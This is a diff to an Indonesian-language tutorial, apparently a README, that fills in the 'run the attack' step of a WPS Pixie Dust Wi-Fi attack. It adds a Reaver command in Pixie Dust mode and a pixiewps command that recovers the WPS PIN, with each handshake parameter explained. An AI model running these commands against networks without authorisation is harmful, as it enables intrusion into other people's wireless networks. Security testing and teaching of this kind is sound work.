@@ -58,9 +58,24 @@ Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur 
 
 **3. Jalankan Serangan:**
 
+1. Jalankan Reaver untuk mengumpulkan data WPS:
+
    ```
-   $
+   sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
    ```
+2. Jalankan Pixiewps dengan data yang didapat:
+
+   ```
+   sudo pixiewps -e [pke] -r [pkr] -s [e-hash1] -z [e-hash2] -a [authkey] -n [e-nonce]
+   ```
+
+   Keterangan:
+   - `-e [pke]` : Enrollee Public Key -> len = 192
+   - `-r [pkr]` : Registrar Public Key -> len = 192
+   - `-s [e-hash1]` : Enrollee Hash1 -> len = 32
+   - `-z [e-hash2]` : Enrollee Hash2 -> len = 32
+   - `-a [authkey]` : Authentication Session Key -> len = 32
+   - `-n [e-nonce]` : Enrollee Nonce -> len = 16
 
 ## Video Demonstrasi
 
